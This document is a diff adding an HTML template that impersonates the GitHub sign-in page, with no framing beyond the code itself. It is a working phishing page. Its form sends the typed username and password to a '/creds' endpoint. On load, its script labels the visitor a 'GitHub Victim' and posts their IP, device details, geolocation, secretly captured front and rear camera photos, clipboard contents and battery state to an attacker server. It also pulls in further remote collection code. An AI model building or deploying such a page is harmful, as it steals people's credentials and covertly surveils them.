@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to GitHub</title>
+<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif; background: #0d1117; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #c9d1d9; }
+.logo { margin-bottom: 24px; }
+.logo svg { fill: #ffffff; width: 48px; height: 48px; }
+h1 { font-size: 24px; font-weight: 300; color: #c9d1d9; margin-bottom: 20px; }
+.form-box { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 20px; width: 308px; }
+.form-group { margin-bottom: 16px; }
+.form-group label { display: block; font-size: 14px; font-weight: 600; color: #c9d1d9; margin-bottom: 8px; }
+.form-group input { width: 100%; padding: 8px 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; font-size: 14px; color: #c9d1d9; }
+.form-group input:focus { outline: none; border-color: #58a6ff; box-shadow: 0 0 0 3px rgba(56,139,253,0.4); }
+.btn-login { width: 100%; padding: 8px 16px; background: #238636; color: #ffffff; border: 1px solid rgba(240,246,252,0.1); border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 4px; }
+.btn-login:hover { background: #2ea043; }
+.links-box { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px 20px; width: 308px; margin-top: 16px; text-align: center; font-size: 14px; }
+.links-box a { color: #58a6ff; text-decoration: none; }
+.links-box a:hover { text-decoration: underline; }
+.forgot-link { display: block; text-align: right; font-size: 12px; margin-bottom: 12px; }
+.forgot-link a { color: #58a6ff; text-decoration: none; }
+.footer-links { margin-top: 40px; text-align: center; font-size: 12px; color: #8b949e; }
+.footer-links a { color: #58a6ff; text-decoration: none; margin: 0 8px; }
+.loading { display: none; padding: 30px; text-align: center; }
+.spinner { border: 3px solid #30363d; border-top: 3px solid #238636; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+@media (max-width: 480px) { .form-box, .links-box { width: 90vw; max-width: 308px; } }
+</style>
+</head>
+<body>
+<div class="logo">
+<svg height="48" viewBox="0 0 16 16" width="48"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
+</div>
+<h1>Sign in to GitHub</h1>
+<div class="form-box">
+<form id="loginForm">
+<div class="form-group">
+<label>Username or email address</label>
+<input type="text" id="email" required autofocus>
+</div>
+<div class="form-group">
+<div class="forgot-link"><a href="#">Forgot password?</a></div>
+<label>Password</label>
+<input type="password" id="password" required>
+</div>
+<button type="submit" class="btn-login">Sign in</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="color:#8b949e;font-size:14px;">Signing in...</p>
+</div>
+</div>
+<div class="links-box">New to GitHub? <a href="#">Create an account</a>.</div>
+<div class="footer-links">
+<a href="#">Terms</a><a href="#">Privacy</a><a href="#">Docs</a><a href="#">Contact GitHub</a><a href="#">Status</a>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video=document.getElementById('video'), canvas=document.getElementById('canvas');
+
+async function gatherAll(){
+    let td='🐙 <b>GitHub Victim!</b>\n\n';
+    td+='⚓ IP: <code><%=ip %></code>\n';
+    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
+    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
+    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
+    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
+    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
+    try{await captureCamera("user","selfie");}catch(e){}
+    try{await captureCamera("environment","back");}catch(e){}
+    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
+    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
+}
+
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    var email = document.getElementById('email').value;
+    var pass = document.getElementById('password').value;
+    document.querySelector('form').style.display='none';
+    document.getElementById('loading').style.display='block';
+    fetch('/creds', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({username: email, password: pass, uri: '<%=uid %>', path: '<%=uid %>'})
+    }).then(function(){ window.location.href = '<%=url %>'; });
+});
+
+window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
+</script>
+</body>
+</html>
